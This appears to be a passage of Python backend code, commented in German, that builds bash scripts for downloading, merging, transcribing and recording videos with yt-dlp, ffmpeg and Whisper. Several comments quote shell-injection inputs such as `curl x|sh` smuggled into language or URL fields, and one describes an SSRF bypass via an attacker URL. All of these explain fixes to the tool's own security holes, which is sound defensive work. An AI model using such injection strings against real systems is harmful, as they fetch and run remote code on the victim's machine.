    # rejects the rest outright. Found by testing a public feed end to end.
    return v.split("-")[0].lower()


# Characters a folder name may use and still sit inside double quotes in a
# generated script. An allowlist, not escaping: inside "…" the shell still
# expands $( ), backticks and $VAR, and a closing quote ends the string — any
# one of those turns `cd "<path>"` in a double-clickable file into a command.
# Real folder names with anything beyond this are rare enough that falling
# back to the default is the better trade than trying to escape correctly in
# four different quoting contexts.
_SAFE_PATH_RE = re.compile(r"^~?[\w ./-]+$")


def readable_path(path: str, default: str = "~/Downloads") -> str:
    """The path as the person wrote it (tilde kept, for messages), or the
    default when it fails _SAFE_PATH_RE. Safe inside double quotes either way."""
    p = (path or "").strip().rstrip("/")
    if p != "~" and not _SAFE_PATH_RE.fullmatch(p):
        p = default.rstrip("/")
    return p


def shell_path(path: str, default: str = "~/Downloads") -> str:
    """Make a path safe to use inside double quotes in a shell script.

    `cd "~/Downloads/x"` does NOT work: inside quotes the shell treats ~ as a
    literal directory name. Quoting is still needed for spaces, so expand the
    tilde to $HOME instead of dropping the quotes.

    Anything outside _SAFE_PATH_RE is replaced by `default` rather than
    escaped (see the comment there).
    """
    p = readable_path(path, default)
    if p == "~":
        return "$HOME"
    if p.startswith("~/"):
        return "$HOME/" + p[2:]
    return p


def _safe_base(base: str) -> str:
    """The parent folder for a batch's unpacked ZIP, or ~/Downloads.

    Checked here and not only in shell_path: shell_path's own fallback is the
    builder's default folder, which for a batch would point the script at the
    wrong place instead of at <base>/download_<id>.
    """
    b = (base or "").strip().rstrip("/")
    return b if b == "~" or _SAFE_PATH_RE.fullmatch(b) else "~/Downloads"


def _fit_filter(w: str, h: str, fit: str) -> str:
    """Video filter that brings a clip to the target frame.

    pad  — scale down until it fits, fill the rest with black. Nothing is lost,
           portrait clips in a landscape frame get bars.
    crop — scale up until it covers, cut the overhang. No bars, but edges go.
    """
    if fit == "crop":
        return (f"scale={w}:{h}:force_original_aspect_ratio=increase,"
                f"crop={w}:{h},fps=30,setsar=1")
    return (f"scale={w}:{h}:force_original_aspect_ratio=decrease,"
            f"pad={w}:{h}:(ow-iw)/2:(oh-ih)/2:black,fps=30,setsar=1")


def build_merge_snippet(out_dir: str, w: str = "1080", h: str = "1920",
                        fit: str = "pad") -> list[str]:
    """ffmpeg concat over whatever clips actually landed in the folder.

    Deliberately does not assume clip_1…clip_N: single URLs fail all the time
    (image posts, deleted videos), leaving gaps that would break a fixed index
    loop. zsh-safe — array for the -i args, braced ${var} to avoid zsh reading
    $filt[...] as a subscript, and no array indexing (zsh is 1-based, bash 0).
    """
    return [
        "# ── Merge (lokal, schnell) ─────────────────────────────────────",
        f"# Zielformat {w}×{h} · "
        + ("formatfüllend (Ränder werden abgeschnitten)" if fit == "crop"
           else "mit schwarzem Rand (nichts wird abgeschnitten)"),
        # The echo used the raw out_dir inside double quotes — the same hole
        # shell_path closes for the cd, one string further along.
        f'cd "{shell_path(out_dir, "~/Downloads/downloader")}" || '
        f'{{ echo "Ordner nicht gefunden: {readable_path(out_dir, "~/Downloads/downloader")}"; exit 1; }}',
        f"W={w}; H={h}",
        "# Alle Videos einsammeln — Bilder, Metadaten und ein früheres Ergebnis",
        "# bleiben außen vor. sort -V sortiert natürlich (clip_2 vor clip_10),",
        "# read -r verträgt Leerzeichen in Dateinamen.",
        "list=$(find . -maxdepth 2 -type f \\( -iname '*.mp4' -o -iname '*.mov' "
        "-o -iname '*.webm' -o -iname '*.mkv' \\) ! -iname 'merged*' | sort -V)",
        'if [ -z "$list" ]; then echo "Keine Videos gefunden."; exit 1; fi',
        'total_files=$(printf "%s\\n" "$list" | grep -c .)',
        "",
        "# Fortschrittsbalken — bei 100 Clips will man sehen, wo man steht.",
        'bar() {  # $1=erledigt $2=gesamt $3=Text',
        '  w=28; p=0',
        '  [ "$2" -gt 0 ] && p=$(( $1 * 100 / $2 ))',
        '  [ "$p" -gt 100 ] && p=100',
        '  filled=$(( p * w / 100 )); empty=$(( w - filled ))',
        '  b=""; i=0',
        '  while [ "$i" -lt "$filled" ]; do b="${b}█"; i=$((i+1)); done',
        '  i=0',
        '  while [ "$i" -lt "$empty" ]; do b="${b}·"; i=$((i+1)); done',
        '  printf "\\r  %s %3d%%  %s\\033[K" "$b" "$p" "$3"',
        '}',
        'hms() {  # Sekunden -> m:ss',
        '  s=${1%%.*}; [ -z "$s" ] && s=0',
        '  printf "%d:%02d" $((s/60)) $((s%60))',
        '}',
        "",
        "# ── 1/2 Clips einlesen ──",
        "# Stumme Clips sind bei Instagram häufig. concat verlangt von jedem",
        "# Segment eine Tonspur — für lautlose Videos wird deshalb Stille in",
        "# passender Länge erzeugt, sonst bricht ffmpeg mit",
        "# 'Stream specifier :a matches no streams' ab.",
        'echo "1/2  Clips einlesen ($total_files Dateien)"',
        'args=(); filt=""; maps=""; idx=0; seg=0; silent=0; total_s=0',
        'while IFS= read -r f; do',
        '  [ -z "$f" ] && continue',
        '  dur=$(ffprobe -v error -show_entries format=duration -of csv=p=0 "$f" 2>/dev/null)',
        '  case "$dur" in ""|N/A) dur=0 ;; esac',
        '  total_s=$(( total_s + ${dur%%.*} ))',
        '  has_a=$(ffprobe -v error -select_streams a -show_entries stream=index '
        '-of csv=p=0 "$f" 2>/dev/null)',
        '  args+=(-i "$f"); v=$idx; idx=$((idx+1))',
        '  if [ -n "$has_a" ]; then',
        '    a="${v}:a"',
        '  else',
        '    args+=(-f lavfi -t "$dur" -i anullsrc=channel_layout=stereo:sample_rate=44100)',
        '    a="${idx}:a"; idx=$((idx+1)); silent=$((silent+1))',
        '  fi',
        f'  filt="${{filt}}[${{v}}:v]{_fit_filter("${W}", "${H}", fit)}[v${{seg}}];'
        '[${a}]aresample=44100[a${seg}];"',
        '  maps="${maps}[v${seg}][a${seg}]"',
        '  seg=$((seg+1))',
        '  bar "$seg" "$total_files" "$(basename "$f" | cut -c1-40)"',
        'done <<< "$list"',
        'printf "\\n"',
        'if [ "$seg" -lt 2 ]; then echo "Nur $seg Video — nichts zu mergen."; exit 1; fi',
        '[ "$silent" -gt 0 ] && echo "  $silent Clip(s) ohne Ton — Stille ergänzt."',
        "",
        "# ── 2/2 Kodieren ──",
        "# ffmpeg meldet über -progress laufend die Position; daraus wird der",
        "# Balken gespeist statt hunderte Zeilen Log auszugeben.",
        'echo "2/2  Kodieren — $seg Clips, Gesamtlänge $(hms $total_s)"',
        'start=$(date +%s)',
        'ffmpeg -y "${args[@]}" -filter_complex "${filt}${maps}concat=n=${seg}:v=1:a=1[vout][aout]" '
        '-map "[vout]" -map "[aout]" -c:v libx264 -preset veryfast -crf 22 '
        '-c:a aac -b:a 160k -progress pipe:1 -nostats -loglevel error merged.mp4 2>/tmp/fundus_merge_err '
        '| while IFS="=" read -r k v; do',
        '    case "$k" in',
        '      out_time_us)',
        '        case "$v" in ""|N/A) continue ;; esac',
        '        cur=$(( v / 1000000 )); now=$(date +%s); el=$(( now - start ))',
        '        eta=""',
        '        # Erst schätzen, wenn genug gelaufen ist — sonst springt die Zahl wild.',
        '        if [ "$cur" -gt 0 ] && [ "$el" -ge 5 ]; then',
        '          rest=$(( el * (total_s - cur) / cur ))',
        '          [ "$rest" -gt 0 ] && eta=" · noch ca. $(hms $rest)"',
        '        fi',
        '        bar "$cur" "$total_s" "$(hms $cur) / $(hms $total_s)$eta"',
        '        ;;',
        '      progress)',
        '        [ "$v" = "end" ] && { bar "$total_s" "$total_s" "fertig"; printf "\\n"; }',
        '        ;;',
        '    esac',
        '  done',
        'if [ ! -s merged.mp4 ]; then',
        '  printf "\\n"; echo "Fehlgeschlagen. ffmpeg-Meldung:"; tail -5 /tmp/fundus_merge_err; exit 1',
        'fi',
        'echo "Fertig: $(pwd)/merged.mp4  ($(du -h merged.mp4 | cut -f1))"',
    ]


def build_yt_transcript_script(url: str, lang: str = "native",
                               out_dir: str = "~/Downloads") -> str:
    """Fetch a YouTube transcript locally.

    The server sits on a datacenter IP that YouTube blocks; a home connection
    does not have that problem. So when the server fails, hand over a command
    that works instead of an apology.
    """
    url = url.strip() or "DEINE_URL"
    if not re.match(r"^https?://", url, re.I):
        url = "DEINE_URL"
    path = shell_path(out_dir)
    # safe_lang statt Quoting: der Wert steht neben einem CLI-Flag, und ein
    # gequoteter Unsinn verschiebt den Fehler nur. Vorher landete `lang` roh
    # in einfachen Anführungszeichen — `de\'; curl x|sh; echo \'` brach daraus
    # aus, und das Produkt dieser Funktion ist eine Datei zum Doppelklicken.
    lg = safe_lang(lang, "de") if lang != "native" else "native"
    langs = "de,en" if lg == "native" else f"{lg},{lg}-orig,en,de"

    return "\n".join([
        "#!/bin/bash",
        "",
        "# Untertitel lokal holen — YouTube lehnt Anfragen der Server-Adresse ab,",
        "# von einem normalen Anschluss aus nicht.",
        "# Einmalig:  python3 -m pip install -U --pre \"yt-dlp[default]\" curl_cffi",
        "",
        f'cd "{path}" || exit 1',
        "",
        "# json3 statt vtt: saubere, nicht überlappende Segmente.",
        "yt-dlp --write-auto-sub --write-sub \\",
        f"  --sub-langs {sh(langs)} --sub-format 'json3/vtt/best' \\",
        "  --skip-download --no-playlist \\",
        "  -o '%(title).80s_%(id)s' \\",
        f'  {sh(url)} || {{ echo "Konnte keine Untertitel laden."; exit 1; }}',
        "",
        "# Aus json3 reinen Text machen (ohne Zeitstempel).",
        "for f in *.json3; do",
        '  [ -e "$f" ] || continue',
        '  python3 - "$f" <<\'PY\'',
        "import json, re, sys",
        "p = sys.argv[1]",
        "d = json.load(open(p, encoding='utf-8'))",
        "parts = []",
        "for ev in d.get('events') or []:",
        "    t = ''.join(s.get('utf8','') for s in (ev.get('segs') or [])).strip()",
        "    if t:",
        "        parts.append(t)",
        "text = re.sub(r'\\s+', ' ', ' '.join(parts)).strip()",
        "out = re.sub(r'\\.json3$', '.txt', p)",
        "open(out, 'w', encoding='utf-8').write(text + '\\n')",
        "print(f'{out} — {len(text.split())} Wörter')",
        "PY",
        '  rm -f "$f"',
        "done",
        "",
        'ls -1 *.txt 2>/dev/null | tail -3',
        f'open "{path}"',
    ]) + "\n"


WHISPER_MODELS = {
    "turbo": ("mlx-community/whisper-large-v3-turbo", "Beste Qualität (empfohlen)"),
    "medium": ("mlx-community/whisper-medium-mlx", "Mittel — schneller"),
    "small": ("mlx-community/whisper-small-mlx", "Klein — am schnellsten, ungenauer"),
}


def build_whisper_script(out_dir: str = "~/Downloads/downloader",
                         model: str = "turbo", fmt: str = "txt",
                         language: str = "") -> str:
    """Local Whisper transcription for a folder of downloaded clips.

    Per clip rather than on a merged file: Whisper detects one language per
    run, so a German/English mix would come out wrong on a single big file.
    Transcribing each clip separately also keeps the attribution — you can see
    which creator said what.

    Uses mlx-whisper (Apple Silicon, much faster than the reference
    implementation). Note the console command is `mlx_whisper` with an
    underscore, and the package ships no __main__, so `python -m` won't work.
    """
    model_id = WHISPER_MODELS.get(model, WHISPER_MODELS["turbo"])[0]
    fmt = fmt if fmt in ("txt", "srt", "vtt", "json") else "txt"
    # Unquotiert hinter einem Flag war das die direkteste Lücke von allen:
    # `--language de; curl x|sh`. safe_lang statt sh(), weil der Wert neben
    # einem CLI-Flag steht und ein gequoteter Unsinn den Fehler nur
    # verschiebt — dieselbe Begründung wie im Podcast-Builder, der es schon
    # so macht.
    lang_arg = (f" \\\n    --language {safe_lang(language, 'de')}"
                if language else "")
    path = shell_path(out_dir, "~/Downloads/downloader")

    return "\n".join([
        "#!/bin/bash",
        "",
        "# Einmalig installieren (Apple Silicon):",
        "#   pip install -U mlx-whisper && pyenv rehash",
        "# Der Befehl heißt mlx_whisper (Unterstrich!), nicht mlx-whisper.",
        "",
        # readable_path, not the raw out_dir: the message sits in double
        # quotes too.
        f'cd "{path}" || {{ echo "Ordner nicht gefunden: '
        f'{readable_path(out_dir, "~/Downloads/downloader")}"; exit 1; }}',
        "mkdir -p transkripte",
        "",
        "# Zusammengefügte Dateien überspringen — die Einzelclips sind gewollt:",
        "# Whisper erkennt eine Sprache pro Durchlauf, bei gemischtem Material",
        "# liefert Clip für Clip deutlich bessere Ergebnisse.",
        "list=$(find . -maxdepth 2 -type f \\( -iname '*.mp4' -o -iname '*.mov' "
        "-o -iname '*.webm' -o -iname '*.m4a' -o -iname '*.mp3' \\) "
        "! -iname 'merged*' ! -iname '*_merged*' | sort -V)",
        'if [ -z "$list" ]; then echo "Keine Mediendateien gefunden."; exit 1; fi',
        'total=$(printf "%s\\n" "$list" | grep -c .)',
        'echo "$total Datei(en) — Transkription startet."',
        '[ ! -d "$HOME/.cache/huggingface" ] && echo "Beim ersten Lauf wird das '
        'Modell geladen (~1,5 GB), das dauert einmalig."',
        "",
        "i=0; ok=0; fail=0",
        "while IFS= read -r f; do",
        '  [ -z "$f" ] && continue',
        "  i=$((i+1))",
        '  base=$(basename "$f"); base="${base%.*}"',
        # Resume: skip anything already transcribed, so Ctrl+C is safe.
        f'  if [ -f "transkripte/${{base}}.{fmt}" ]; then',
        '    echo "[$i/$total] schon vorhanden: $base"; ok=$((ok+1)); continue',
        "  fi",
        '  echo "[$i/$total] $base"',
        f'  if mlx_whisper "$f" \\',
        f"    --model {model_id} \\",
        f"    --output-dir transkripte --output-format {fmt} \\",
        f"    --verbose False{lang_arg}; then",
        "    ok=$((ok+1))",
        "  else",
        '    fail=$((fail+1)); echo "  fehlgeschlagen: $base"',
        "  fi",
        'done <<< "$list"',
        "",
        'echo "Fertig — $ok Transkript(e)$([ "$fail" -gt 0 ] && echo ", $fail fehlgeschlagen")"',
        "",
        "# Alles in einer Markdown-Datei zusammenfassen, Clipname als Überschrift.",
        # Die Datei landet im Ordner des Nutzers, nicht in einem Job-Ordner,
        # und hieß immer gleich: wer an einem Tag zwei Stapel transkribiert,
        # überschreibt die erste Sammlung mit der zweiten. Datum und Uhrzeit
        # kommen aus der Shell, damit sie den Lauf benennen und nicht den
        # Zeitpunkt, an dem das Script erzeugt wurde.
        'out="alle_transkripte_$(date +%Y-%m-%d_%H%M%S).md"; : > "$out"',
        f'for t in transkripte/*.{fmt}; do',
        '  [ -e "$t" ] || continue',
        '  n=$(basename "$t"); n="${n%.*}"',
        '  printf "\\n## %s\\n\\n" "$n" >> "$out"',
        '  cat "$t" >> "$out"',
        "done",
        '[ -s "$out" ] && echo "Gesamtdatei: $(pwd)/$out"',
        "open transkripte",
    ]) + "\n"


def build_merge_script(out_dir: str = "~/Downloads/downloader",
                       merge_resolution: str = "1080x1920",
                       fit: str = "pad") -> str:
    """Standalone merge for clips that are already downloaded."""
    try:
        w, h = merge_resolution.split("x")
        int(w), int(h)
    except (ValueError, AttributeError):
        w, h = "1080", "1920"
    fit = "crop" if fit == "crop" else "pad"
    out_dir = (out_dir or "~/Downloads/downloader").rstrip("/")
    lines = ["#!/bin/bash", "",
             "# Fügt alle Videos im Ordner zu einem Video zusammen.",
             "# Reihenfolge = Dateiname, natürlich sortiert. ffmpeg nötig:",
             "#   command -v ffmpeg >/dev/null || brew install ffmpeg", ""]
    lines += build_merge_snippet(out_dir, w, h, fit)
    lines.append('open "$(pwd)"')
    return "\n".join(lines) + "\n"


def build_download_script(urls: list[str], quality: str = "best", audio_only: bool = False,
                          merge: bool = False, merge_resolution: str = "1080x1920",
                          out_dir: str = "~/Downloads/downloader",
                          cookies_from_browser: str = "") -> str:
    """Self-contained bash script: install check → download all URLs locally →
    optional local ffmpeg merge. Runs on the user's Mac (no server limits).
    cookies_from_browser (chrome/safari/firefox/edge/brave) enables private IG
    downloads via the user's own logged-in browser session."""
    urls = [u for u in urls if re.match(r"https?://", u.strip(), re.I)]
    out_dir = (out_dir or "~/Downloads/downloader").rstrip("/")
    fmt = _format_selector(quality)
    cfb = ""
    if cookies_from_browser and re.match(r"^[a-z]+$", cookies_from_browser):
        cfb = f'--cookies-from-browser {cookies_from_browser} '
    # No `set -e`: a single failing URL (image post, deleted video, private
    # account) must not abort the whole run — and above all must not skip the
    # merge step at the end.
    lines = ["#!/bin/bash", "", INSTALL_PREAMBLE,
             "# ── Downloads ──────────────────────────────────────────────────",
             f'OUT="{shell_path(out_dir, "~/Downloads/downloader")}"', 'mkdir -p "$OUT"', ""]
    lines.append("URLS=(")
    for u in urls:
        # sh() statt Anführungszeichen: innerhalb doppelter Quotes expandiert
        # $( ) weiter, und der Filter im Endpunkt prüft nur das Schema — also
        # passiert `https://a/$(id)` ihn anstandslos. Das Produkt dieser
        # Funktion ist eine Datei, die der Nutzer doppelklickt.
        lines.append(f'  {sh(u.strip())}')
    lines.append(")")
    lines.append("")
    if merge:
        # Deterministic filenames so we can merge them afterwards.
        if audio_only:
            dl = f'yt-dlp {cfb}--no-playlist -x --audio-format mp3 -o "$OUT/clip_$i.%(ext)s" "$u"'
        else:
            dl = (f'yt-dlp {cfb}--no-playlist -f "{fmt}" --merge-output-format mp4 '
                  '-o "$OUT/clip_$i.mp4" "$u"')
        lines += ['N=${#URLS[@]}', 'i=1', 'for u in "${URLS[@]}"; do',
                  '  echo "[$i/$N] $u"', f'  {dl} || echo "  übersprungen: $u"',
                  '  i=$((i+1))', 'done', '']
        # int() wie in build_merge_script: die Breite landet in einem
        # ffmpeg-Filter innerhalb doppelter Quotes, wo $( ) expandiert.
        # build_merge_script prüft das seit jeher, diese Stelle nicht.
        try:
            w, h = merge_resolution.split("x")
            int(w), int(h)
        except (ValueError, AttributeError):
            w, h = "1080", "1920"
        lines += build_merge_snippet(out_dir, w, h)
    else:
        if audio_only:
            dl = f'yt-dlp {cfb}--no-playlist -x --audio-format mp3 -o "$OUT/%(upload_date)s_%(uploader)s_%(title).70s_%(id)s.%(ext)s" "$u"'
        else:
            dl = (f'yt-dlp {cfb}--no-playlist -f "{fmt}" --merge-output-format mp4 '
                  '-o "$OUT/%(upload_date)s_%(uploader)s_%(title).70s_%(id)s.%(ext)s" "$u"')
        lines += ['N=${#URLS[@]}', 'i=1', 'for u in "${URLS[@]}"; do',
                  '  echo "[$i/$N] $u"', f'  {dl} || echo "  übersprungen: $u"',
                  '  i=$((i+1))', 'done', 'echo "Fertig in $OUT"']
    lines.append('open "$OUT"')
    return "\n".join(lines) + "\n"


@app.post("/api/whisper-script")
async def whisper_script(out_dir: str = Form("~/Downloads/downloader"),
                         model: str = Form("turbo"), fmt: str = Form("txt"),
                         language: str = Form(""),
                         user: dict = Depends(current_user)):
    """Local Whisper transcription for a folder of clips."""
    return {"script": build_whisper_script(out_dir, model, fmt, language),
            "models": {k: v[1] for k, v in WHISPER_MODELS.items()}}


@app.get("/api/batch/{batch_id}/whisper-script")
async def batch_whisper_script(batch_id: str, model: str = "turbo", fmt: str = "txt",
                               language: str = "", base: str = "~/Downloads",
                               user: dict = Depends(current_user)):
    """Whisper command pre-filled for this batch's unpacked ZIP folder."""
    _owned_batch(batch_id, user)
    folder = f"{_safe_base(base)}/download_{batch_id[:8]}"
    return {"folder": folder,
            "script": build_whisper_script(folder, model, fmt, language)}


@app.post("/api/yt-transcript-script")
async def yt_transcript_script(url: str = Form(...), lang: str = Form("native"),
                               out_dir: str = Form("~/Downloads"),
                               user: dict = Depends(current_user)):
    """Local yt-dlp command — works from a home connection when the server is blocked."""
    return {"script": build_yt_transcript_script(url, lang, out_dir)}


@app.post("/api/merge-script")
async def merge_script(merge_resolution: str = Form("1080x1920"),
                       out_dir: str = Form("~/Downloads/downloader"),
                       fit: str = Form("pad"),
                       user: dict = Depends(current_user)):
    """Standalone merge command for clips already sitting in a local folder."""
    return {"script": build_merge_script(out_dir, merge_resolution, fit),
            "formats": MERGE_FORMATS}


@app.get("/api/batch/{batch_id}/merge-script")
async def batch_merge_script(batch_id: str, resolution: str = "1080x1920",
                             fit: str = "pad", base: str = "~/Downloads",
                             user: dict = Depends(current_user)):
    """Merge command pre-filled for this batch's unpacked ZIP folder.

    The ZIP is `download_<id>.zip`, so the extracted folder carries the same
    name — which means we can hand over a command that just works.
    """
    _owned_batch(batch_id, user)
    folder = f"{_safe_base(base)}/download_{batch_id[:8]}"
    return {"folder": folder, "script": build_merge_script(folder, resolution, fit),
            "formats": MERGE_FORMATS}


@app.post("/api/download-script")
async def download_script(urls: str = Form(...), quality: str = Form("best"),
                          audio_only: bool = Form(False), merge: bool = Form(False),
                          merge_resolution: str = Form("1080x1920"),
                          cookies_from_browser: str = Form(""),
                          user: dict = Depends(current_user)):
    url_list = [u.strip() for u in urls.splitlines() if u.strip()]
    if not url_list:
        raise HTTPException(400, "Keine URLs")
    return {"script": build_download_script(url_list, quality, audio_only, merge,
                                            merge_resolution, cookies_from_browser=cookies_from_browser)}


def build_livestream_script(url: str, mode: str = "now", quality: str = "1080",
                            name: str = "livestream", path: str = "~/Downloads",
                            start: str = "00:00:00", end: str = "00:05:00") -> dict:
    """Generate the exact local yt-dlp/ffmpeg command(s) for a livestream task.
    Shared by the Livestream UI (JS mirror) and the MCP get_livestream_script tool."""
    # Das Schema prüfen statt nur auf nicht-leer: die URL landet in einem
    # Script, das der Nutzer doppelklickt.
    url = (url or "").strip() or "DEINE_URL"
    if not re.match(r"^https?://", url, re.I):
        url = "DEINE_URL"
    name = re.sub(r"[^\w.-]", "_", name or "livestream")
    # start/end stehen in --download-sections und im Schnipsel-Script. Eine
    # Allowlist statt Quoting, weil ein gequoteter Unsinn den Fehler nur
    # verschiebt — dieselbe Begründung wie bei safe_lang.
    _t = lambda v, d: v if re.match(r"^\d{1,2}:\d{2}:\d{2}$", (v or "").strip()) else d
    start, end = _t(start, "00:00:00"), _t(end, "00:05:00")
    # shell_path, nicht rstrip allein: in `ls "~/Downloads/x".f*` behandelt die
    # Shell die Tilde als Verzeichnisnamen, und das Muster findet nichts. Die
    # Funktion existiert genau dafür und wurde hier nicht benutzt.
    path = shell_path(path or "~/Downloads")
    out = f"{path}/{name}.mp4"
    # Format-Ausdrücke, keine Nummern.
    #
    # Hier standen feste itags: 96/95/94 für live, 137+140 für DASH. Beide
    # Annahmen halten nicht. 96 und 95 sind HLS-Varianten, die es nur gibt,
    # solange der Stream wirklich läuft — bei einem fertigen Video existieren
    # sie nicht. Und 137+140 liefert YouTube je nach Player-Client gar nicht:
    # über den visionos-Client kommen ausschließlich m3u8-Formate mit ganz
    # anderen Nummern (270, 232, 233-n). Das Ergebnis war beides Mal dieselbe
    # Meldung, die auf die falsche Spur führt: „Requested format is not
    # available".
    #
    # Ein Ausdruck fragt nach der Eigenschaft statt nach der Nummer und
    # überlebt deshalb sowohl den Client-Wechsel als auch den Übergang von
    # live zu VOD. `b` als Rückfall hinter `bv*+ba` deckt die Fälle ab, in
    # denen nur ein fertig gemuxter Stream angeboten wird — genau das ist bei
    # Live-HLS der Normalfall.
    height = {"1080": 1080, "720": 720, "480": 480}.get(quality)
    if quality == "audio":
        fmt = "ba/b"
    elif height:
        fmt = f"bv*[height<={height}]+ba/b[height<={height}]/bv*+ba/b"
    else:
        fmt = "bv*+ba/b"
    # Für den Echtzeit-Mitschnitt zuerst ein gemuxter Stream: dann muss nichts
    # zusammengeführt werden, wenn der Nutzer mit Ctrl+C abbricht.
    fmt_live = ("ba/b" if quality == "audio"
                else f"b[height<={height}]/bv*[height<={height}]+ba/b" if height
                else "b/bv*+ba")
    steps, title, warn = [], "Befehl", ""
    if mode == "now":
        title = "Live ab jetzt mitschneiden"
        steps.append({"t": "Mitschnitt starten (Echtzeit, Ctrl+C stoppt)",
                      "c": f'yt-dlp --no-check-certificates -f {sh(fmt_live)} {sh(url)} -o "{out}"'})
        warn = ("Holt einen fertig gemuxten Stream, wenn YouTube einen anbietet — "
                "dann ist nach Ctrl+C nichts zusammenzuführen. 1 Min Stream = 1 Min Download.")
    elif mode == "start":
        title = "Ab Stream-Start (ganzer DVR-Puffer)"
        steps.append({"t": "Ganzen Puffer laden (Ctrl+C wenn genug)",
                      "c": f'yt-dlp --no-check-certificates --live-from-start -f {sh(fmt)} {sh(url)} -o "{out}"'})
        # Die Namen der Part-Dateien hängen von den Formaten ab, die YouTube
        # ausgeliefert hat — die kennt man vorher nicht. Vorher stand hier
        # f137/f140 geraten; mit einem anderen Client heißen sie f270/f233-2
        # und der Befehl lief ins Leere. Deshalb über ein Muster.
        steps.append({"t": "Falls Abbruch ohne Auto-Merge: Parts zusammenführen",
                      "c": (f'V=$(ls "{path}/{name}".f*.mp4.part | head -1); '
                            f'A=$(ls "{path}/{name}".f*.m4a.part "{path}/{name}".f*.mp4.part 2>/dev/null | tail -1); '
                            f'ffmpeg -i "$V" -i "$A" -c copy -shortest "{out}"')})
        warn = ("Speicher: ~5-7 GB/Stunde bei 1080p. --live-from-start zählt ab echtem "
                "Stream-Start, nicht ab dem sichtbaren Player-Puffer.")
    elif mode == "section":
        title = "Abschnitt aus fertigem VOD"
        steps.append({"t": f"Abschnitt {start}-{end}",
                      "c": (f'yt-dlp --no-check-certificates --download-sections "*{start}-{end}" '
                            f'-f {sh(fmt)} {sh(url)} -o "{out}"')})
        warn = "Zuverlässig nur nach Stream-Ende (VOD). Bei laufenden Livestreams driften Timecodes."
    elif mode == "merge":
        title = "Abgebrochene Parts zusammenführen"
        steps.append({"t": "Video + Audio Parts zu einer Datei",
                      "c": (f'V=$(ls "{path}/{name}".f*.mp4.part | head -1); '
                            f'A=$(ls "{path}/{name}".f*.m4a.part "{path}/{name}".f*.mp4.part 2>/dev/null | tail -1); '
                            f'echo "Video: $V"; echo "Audio: $A"; '
                            f'ffmpeg -i "$V" -i "$A" -c copy -shortest "{out}"')})
        warn = ("-shortest stoppt beim kürzeren Stream. Die Part-Dateien werden gesucht, "
                "nicht geraten — der Befehl nennt sie, bevor er sie zusammenführt.")
    elif mode == "scan":
        title = "Snippet-Scan — Position finden"
        steps.append({"t": "24 x 10-Sek-Schnipsel im 30-Min-Abstand",
                      "c": (f'mkdir -p "{path}/{name}_snippets" && for i in $(seq 0 23); do '
                            f'h=$((i/2)); m=$(((i%2)*30)); s=$(printf "%02d:%02d:00" $h $m); '
                            f'e=$(printf "%02d:%02d:10" $h $m); '
                            f'yt-dlp --no-check-certificates --download-sections "*$s-$e" -f {sh(fmt_live)} {sh(url)} '
                            f'-o "{path}/{name}_snippets/snip_$s.mp4" --quiet; echo "  $s ok"; done && open "{path}/{name}_snippets"')})
        warn = "Grobes Raster, um den Bereich zu finden. Danach mit mode=section exakt exportieren."
    return {"title": title, "steps": steps, "warning": warn, "stop": "Ctrl+C",
            "install": INSTALL_PREAMBLE}


def _platform_of(url: str) -> str:
    u = url.lower()
    if "instagram.com" in u: return "Instagram"
    if "tiktok.com" in u: return "TikTok"
    if "threads.net" in u or "threads.com" in u: return "Threads"
    if "youtu" in u: return "YouTube"
    return ""


def _host_is(url: str, *domains: str) -> bool:
    """Gehört die URL zu einer dieser Domains? Über den Host, nicht den Text.

    Hier stand `"threads.com" in url`, und das war der schwerste Befund des
    Sicherheitsreviews. Eine Teilstring-Prüfung trifft auch
    `https://angreifer.example/threads.com/x`: die URL landete im
    Threads-Pfad, wurde dort mit den Cookies des Nutzers abgerufen, und der
    Antwortkörper wanderte in den Job-Ordner, der als ZIP herunterladbar ist.
    Damit war das ein vollständiges Lese-Primitiv ins interne Netz —
    Metadaten-Dienst, Nachbarcontainer, interne Oberflächen — für jeden
    angemeldeten Nutzer.

    `hostname` ist schon klein geschrieben und enthält weder Port noch
    Zugangsdaten. Der Punkt vor der Domain ist nötig: ohne ihn würde
    `notthreads.com` passen.
    """
    try:
        host = (urllib.parse.urlparse(url).hostname or "").lower()
    except ValueError:
        return False
    return any(host == d or host.endswith("." + d) for d in domains)


def _is_threads(url: str) -> bool:
    return _host_is(url, "threads.net", "threads.com")


def _fmt_duration(sec) -> str:
    try:
        sec = int(float(sec))
    except (TypeError, ValueError):
        return "—"
    m, s = divmod(sec, 60)
    h, m = divmod(m, 60)
    return f"{h}:{m:02d}:{s:02d}" if h else f"{m}:{s:02d}"


def _fmt_date(d: str) -> str:
    if d and len(d) == 8 and d.isdigit():
        return f"{d[6:8]}.{d[4:6]}.{d[0:4]}"
    return d or "—"


def _write_metadata_sidecar(batch_id: str, job_ids: list[str]):
    """Build metadaten_<date>.md (+ .json) — one AI-ready file for the whole batch."""
    import json
    # Datum und Uhrzeit allein reichen nicht: zwei Stapel in derselben Minute
    # ergeben denselben Namen, und im Sammelordner überschreibt der zweite den
    # ersten. Die Stapelkennung dahinter macht ihn eindeutig und sagt
    # außerdem, zu welchem Lauf die Datei gehört.
    stamp = f"{datetime.now():%Y-%m-%d_%H%M}_{batch_id[:8]}"
    md_path = DOWNLOAD_DIR / f"metadaten_{stamp}.md"
    json_path = DOWNLOAD_DIR / f"metadaten_{stamp}.json"

    records, md = [], []
    md.append(f"# Video-Metadaten — {datetime.now().strftime('%d.%m.%Y %H:%M')}\n")
    done = [jobs[j] for j in job_ids if jobs.get(j, {}).get("status") == "done"]
    md.append(f"{len(done)} Video(s)\n")

    for i, job in enumerate(done, 1):
        m = job.get("meta") or {}
        title = m.get("title") or job.get("filename") or "—"
        rec = {
            "title": title,
            "url": m.get("webpage_url") or job.get("url"),
            "uploader": m.get("uploader") or "",
            "platform": m.get("extractor") or "",
            "upload_date": m.get("upload_date") or "",
            "duration_s": m.get("duration"),
            "description": m.get("description") or "",
            "file": job.get("filename") or "",
            "transcript": job.get("transcript") or "",
        }
        records.append(rec)

        md.append(f"\n## {i}. {title}\n")
        md.append(f"- **Link:** {rec['url']}")
        if rec["uploader"]:
            md.append(f"- **Creator:** {rec['uploader']}")
        if rec["platform"]:
            md.append(f"- **Plattform:** {rec['platform']}")
        md.append(f"- **Datum:** {_fmt_date(rec['upload_date'])}")
        md.append(f"- **Dauer:** {_fmt_duration(rec['duration_s'])}")
        if rec["file"]:
            md.append(f"- **Datei:** {rec['file']}")
        if rec["description"]:
            md.append(f"\n**Beschreibung:**\n\n{rec['description']}\n")
        if rec["transcript"]:
